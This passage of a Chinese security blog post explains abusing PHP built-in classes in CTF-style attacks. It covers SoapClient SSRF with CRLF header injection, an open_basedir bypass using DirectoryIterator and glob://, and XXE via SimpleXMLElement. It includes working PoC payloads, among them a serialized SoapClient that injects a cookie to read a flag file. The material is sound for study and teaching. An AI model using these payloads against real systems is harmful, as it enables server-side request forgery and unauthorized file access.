+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>可见，<code>$a</code> 和 <code>$b</code> 这两个错误对象本身是不同的，但是 ==__toString方法返回的结果是相同的==。注意，这里之所以需要在同一行是因为 <code>__toString</code> 返回的数据包含当前行号。</p>
+<p>Exception 类与 Error 的使用和结果完全一样，只不过 <code>Exception</code> 类适用于PHP 5和7，而 <code>Error</code> 只适用于 PHP 7。</p>
+<h1 id="使用SoapClient类进行SSRF"><a href="#使用SoapClient类进行SSRF" class="headerlink" title="使用SoapClient类进行SSRF"></a><strong>使用SoapClient类进行SSRF</strong></h1><h2 id="SoapClient-类"><a href="#SoapClient-类" class="headerlink" title="SoapClient 类"></a>SoapClient 类</h2><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<p>类摘要如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SoapClient &#123;  <span class="comment">/* 方法 */</span>  <span class="keyword">public</span> __construct ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )  <span class="keyword">public</span> __call ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span>  <span class="keyword">public</span> __doRequest ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getCookies ( ) : <span class="keyword">array</span>  <span class="keyword">public</span> __getFunctions ( ) : <span class="keyword">array</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getLastRequest ( ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getLastRequestHeaders ( ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getLastResponse ( ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getLastResponseHeaders ( ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __getTypes ( ) : <span class="keyword">array</span>|<span class="literal">null</span>  <span class="keyword">public</span> __setCookie ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span>  <span class="keyword">public</span> __setLocation ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span>  <span class="keyword">public</span> __setSoapHeaders ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span>  <span class="keyword">public</span> __soapCall ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
+<p>该类的构造函数如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [，<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li>
+<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li>
+</ul>
+<p>==SoapClient是php的一个内置类，它本身是存在CRLF和SSRF漏洞的，怎么说呢？这个类可以控制发送请求包，并且headers可控，不仅可控，还可以传入回车+换行（\r\n），那么被回车下去的请求头不就成了post数据。所以我们可以任意构造请求包，另外，当这个类被调用它没有的方法，会触发它的call，引发SSRF漏洞==</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。</p>
+<p>location是ssrf的利用点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>));<span class="variable">$b</span> = serialize(<span class="variable">$a</span>);<span class="keyword">echo</span> <span class="variable">$b</span>;<span class="variable">$c</span> = unserialize(<span class="variable">$b</span>);<span class="variable">$c</span>-&gt;a();   <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。</p>
+<p>实例poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;aaa\r\nCookie:PHPSESSID=u6ljl69tjrbutbq4i0oeb0m332&quot;</span>,  </span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;bbb&#x27;</span>,</span><br><span class="line">        <span class="comment">// &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php?a=GlobIterator&amp;b=/*f*&#x27; //首先用GlobIterator找flag的名字</span></span><br><span class="line">        <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=file:///f1111llllllaagg&#x27;</span></span><br><span class="line">         </span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="使用-DirectoryIterator-类绕过-open-basedir"><a href="#使用-DirectoryIterator-类绕过-open-basedir" class="headerlink" title="使用 DirectoryIterator 类绕过 open_basedir"></a>使用 DirectoryIterator 类绕过 open_basedir</h1><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。</p>
+<p>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;  </span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># payload一句话的形式:$a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们输入 <code>/?whoami=glob:///*</code> 即可列出根目录下的文件,但是会发现只能列根目录和open_basedir指定的目录的文件，不能列出除前面的目录以外的目录中的文件，且不能读取文件内容。</p>
+<h1 id="使用SimpleXMLElement类进行XXE"><a href="#使用SimpleXMLElement类进行XXE" class="headerlink" title="使用SimpleXMLElement类进行XXE"></a><strong>使用SimpleXMLElement类进行XXE</strong></h1><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
+<h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>通过设置第三个参数 data_is_url 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
+<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/CDNU1RgfeliURN69UZqCTA">https://mp.weixin.qq.com/s/CDNU1RgfeliURN69UZqCTA</a></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/30/linux%E7%9B%AE%E5%BD%95%E5%92%8C%E6%96%87%E4%BB%B6/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Linux重要文件和目录</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      php反序列化小总结
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
